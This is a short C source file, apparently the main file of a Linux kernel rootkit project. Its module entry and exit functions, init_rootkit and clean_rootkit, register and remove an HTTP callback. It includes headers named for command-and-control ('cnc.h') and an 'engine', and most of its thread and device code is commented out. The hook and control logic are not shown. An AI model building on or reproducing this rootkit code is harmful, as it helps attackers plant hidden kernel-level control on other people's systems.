#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/types.h>
#include "engine.h"
#include "cnc.h"
#include "intercom.h"

// typedef struct _run_cmd_args{
// 	char * arg;
// 	unsigned int arg_len;
// }run_cmd_args;


// #include <linux/kthread.h> 
// #include <linux/slab.h> 
// static struct task_struct *thread1;

// typedef struct _run_cmd_args{
// 	char * arg;
// 	unsigned int arg_len;	
// }run_cmd_args;

// static int simple( void *arguments)
// {
// 	run_cmd_args * a = (run_cmd_args*)arguments;
// 	if (a)
// 		printk("arg_len = %d.", a->arg_len);
	
// 	printk("[+] Colman: Simple thread %d\n", arguments);
// 	do_exit(0);

// }

int init_rootkit ( void )
{
	// run_cmd_args * a = (run_cmd_args *)kmalloc(sizeof(run_cmd_args), GFP_ATOMIC);
	// a->arg_len = 112;
	printk(KERN_INFO "[+] Colman: init_rootkit\n");
	// thread1 = kthread_run(simple, a, "simple");

	set_http_callback();
	// if (init_intercom()!=0)
	// {
	//  	unset_http_callback();
	// 	printk("[-] Colman to create dev char: Failed");
	// 	return -1;
	// }

	return 0;
}


void clean_rootkit ( void )
{
	printk(KERN_INFO "[+] Colman: clean_rootkit\n");
	unset_http_callback();
	//clean_intercom();
}


MODULE_LICENSE("GPL");

module_init(init_rootkit);
module_exit(clean_rootkit);
